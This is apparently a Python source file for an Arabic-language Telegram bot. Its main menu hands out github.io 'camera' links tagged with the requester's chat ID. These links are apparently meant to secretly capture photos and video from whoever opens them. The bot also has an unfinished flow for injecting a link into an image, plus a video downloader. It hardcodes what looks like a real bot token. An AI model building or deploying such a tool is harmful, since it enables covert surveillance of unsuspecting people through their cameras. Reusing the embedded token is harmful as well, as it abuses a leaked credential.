import os
import json
import urllib3
import telebot
from telebot import types
from PIL import Image, PngImagePlugin
import threading
import http.server
import time
import yt_dlp

# إيقاف التحذيرات لضمان استقرار الاتصال
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعداد التوكن
BOT_TOKEN = os.getenv("BOT_TOKEN", "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc")
bot = telebot.TeleBot(BOT_TOKEN)

# المسارات والروابط
DB_FILE = "/tmp/voice_db.json"
PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
IMAGE_EDIT_URL = "https://app-display.github.io/-c-om-Copy-Translate-ate-vel-.app-c.html-chatld-/"

user_states = {}
user_data = {}

# --- سيرفر وهمي للحفاظ على نشاط البوت ---
def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    httpd = http.server.HTTPServer(('', port), http.server.SimpleHTTPRequestHandler)
    httpd.serve_forever()

# --- قواعد البيانات ---
def load_db():
    if not os.path.exists(DB_FILE) or os.path.getsize(DB_FILE) == 0:
        return {"girl_1": {}, "girl_2": {}}
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try: return json.load(f)
        except: return {"girl_1": {}, "girl_2": {}}

def save_db(db):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(db, f, indent=4, ensure_ascii=False)

# --- تحميل الفيديو ---
def download_video_sync(url, chat_id):
    try:
        ydl_opts = {
            'format': 'best[ext=mp4]/best',
            'outtmpl': f'/tmp/vid_{chat_id}.mp4',
            'quiet': True,
            'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            return f"/tmp/vid_{chat_id}.mp4", info.get('title', 'Video')
    except Exception as e: return None, str(e)

# --- القوائم ---
def get_main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🖼️ طلب رابط كاميرا الصور", callback_data="get_photo_link"),
        types.InlineKeyboardButton("🎥 طلب رابط كاميرا الفيديو", callback_data="get_video_link"),
        types.InlineKeyboardButton("✨ طلب رابط تعديل الصور", callback_data="get_image_edit_link"),
        types.InlineKeyboardButton("📥 تحميل فيديو مباشر", callback_data="dl_video"),
        types.InlineKeyboardButton("🔒 حقن رابط في صورة", callback_data="inject_start"),
        types.InlineKeyboardButton("🎧 قسم الصوتيات", callback_data="voice_menu")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🤖 **أهلاً بك يا سيف في البوت الشامل!**", parse_mode="Markdown", reply_markup=get_main_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    if call.data == "dl_video":
        user_states[chat_id] = "waiting_for_url"
        bot.edit_message_text("أرسل رابط الفيديو الآن (يوتيوب/فيسبوك/إنستغرام):", chat_id, call.message.message_id)
    elif call.data == "inject_start":
        user_states[chat_id] = "waiting_for_image_inject"
        bot.send_message(chat_id, "📸 أرسل الصورة الآن لحقن الرابط:")
    elif call.data == "get_photo_link":
        bot.send_message(chat_id, f"🖼️ الرابط: {PHOTO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_video_link":
        bot.send_message(chat_id, f"🎥 الرابط: {VIDEO_PAGE_URL}?chatId={chat_id}")
    elif call.data == "get_image_edit_link":
        bot.send_message(chat_id, f"✨ الرابط: {IMAGE_EDIT_URL}?chatId={chat_id}")
    elif call.data == "voice_menu":
        bot.send_message(chat_id, "قسم الصوتيات (مفعل).")
    bot.answer_callback_query(call.id)

@bot.message_handler(content_types=['photo', 'text', 'voice'])
def handle_media(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    
    if state == "waiting_for_url":
        bot.reply_to(message, "⏳ جاري التحميل، يرجى الانتظار...")
        path, title = download_video_sync(message.text, chat_id)
        if path:
            bot.send_video(chat_id, open(path, 'rb'), caption=title)
            os.remove(path)
        else: bot.reply_to(message, f"❌ فشل التحميل: {title}")
        user_states[chat_id] = None
    elif state == "waiting_for_image_inject" and message.photo:
        bot.reply_to(message, "تم استلام الصورة، أرسل الرابط الآن.")
        user_states[chat_id] = "waiting_for_link"

if __name__ == '__main__':
    threading.Thread(target=run_dummy_server, daemon=True).start()
    bot.polling(none_stop=True)
